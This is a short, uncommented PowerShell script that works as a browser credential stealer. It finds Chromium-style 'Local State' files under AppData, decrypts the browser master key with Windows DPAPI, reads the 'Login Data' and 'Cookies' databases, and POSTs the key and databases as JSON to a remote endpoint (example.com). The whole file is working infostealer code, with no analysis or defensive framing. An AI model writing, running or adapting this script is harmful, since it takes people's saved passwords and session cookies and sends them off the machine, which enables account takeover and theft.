$appDataPath = $env:appdata
$localAppDataPath = $env:localappdata

$mainresult = @()

Get-ChildItem -Path $appDataPath, $localAppDataPath -Recurse -Filter "Local State" -File | ForEach-Object {

    $result = @()

    $contentLocalState = Get-Content -Raw -Path $_.FullName | ConvertFrom-Json
    $encryptedKey = [System.Convert]::FromBase64String($contentLocalState.os_crypt.encrypted_key)
    $encryptedKey = $encryptedKey[5..$encryptedKey.Length];
    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, "CurrentUser")
    $masterKey64 = [System.Convert]::ToBase64String($masterKey)

    $logdb = @()
    Get-ChildItem -Path $_.Directory -Recurse -Filter "Login Data" -File | ForEach-Object {
        $contentDb = Get-Content -Path $_.FullName
        $logdb += $contentDb
    }

    $cocdb = @()
    Get-ChildItem -Path $_.Directory -Recurse -Filter "Cookies" -File | ForEach-Object {
        $contentDb = Get-Content -Path $_.FullName
        $cocdb += $contentDb
    }   

    $result += @{ MasterKey = $masterKey64; LoginDatas = $logdb; Cookies = $cocdb }
    $mainresult += $result
}

$json = $mainresult | ConvertTo-Json

$response = Invoke-WebRequest -Method POST -Uri "https://example.com/api/endpoint" -Body $json -ContentType "application/json"
